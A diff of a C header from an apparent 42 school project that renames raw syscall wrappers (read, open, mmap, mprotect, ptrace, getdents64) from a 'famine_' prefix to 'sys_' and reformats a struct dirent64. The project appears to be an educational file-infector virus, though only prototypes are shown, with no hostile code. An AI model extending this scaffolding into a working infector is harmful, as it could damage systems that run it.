@@ -6,7 +6,7 @@
 /*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 22:36:02 by jfortin           #+#    #+#             */
-/*   Updated: 2019/06/12 19:52:22 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/12/22 21:17:15 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -21,35 +21,35 @@
 #include <sys/ptrace.h>
 
 /*
-** file data
+** struct dirent64 realistic reproduction
 */
 
 struct dirent64
 {
-	__ino64_t d_ino;
-	__off64_t d_off;
-	unsigned short int d_reclen;
-	unsigned char d_type;
-	char d_name[256];
+	__ino64_t		d_ino;
+	__off64_t		d_off;
+	unsigned short int	d_reclen;
+	unsigned char		d_type;
+	char			d_name[256];
 };
 
 /*
 ** syscalls
 */
 
-ssize_t		famine_read(int fd, void *buf, size_t count);
-ssize_t		famine_write(int fd, const void *buf, size_t count);
-int		famine_open(const char *pathname, int flags, ...);
-int		famine_close(int fd);
-int		famine_fstat(int fd, struct stat *statbuf);
-void		*famine_mmap(void *addr, size_t length, int prot, int flags, \
+ssize_t		sys_read(int fd, void *buf, size_t count);
+ssize_t		sys_write(int fd, const void *buf, size_t count);
+int		sys_open(const char *pathname, int flags, ...);
+int		sys_close(int fd);
+int		sys_fstat(int fd, struct stat *statbuf);
+void		*sys_mmap(void *addr, size_t length, int prot, int flags, \
 				int fd, off_t offset);
-int		famine_mprotect(void *addr, size_t len, int prot);
-int		famine_munmap(void *addr, size_t length);
-int     	famine_exit(int status);
-long		famine_ptrace(enum __ptrace_request request, pid_t pid, \
+int		sys_mprotect(void *addr, size_t len, int prot);
+int		sys_munmap(void *addr, size_t length);
+int     	sys_exit(int status);
+long		sys_ptrace(enum __ptrace_request request, pid_t pid, \
 				void *addr, void *data);
-int		famine_getdents64(unsigned int fd, struct dirent64 *dirp, \
+int		sys_getdents64(unsigned int fd, struct dirent64 *dirp, \
 				unsigned int count);
 
 #endif
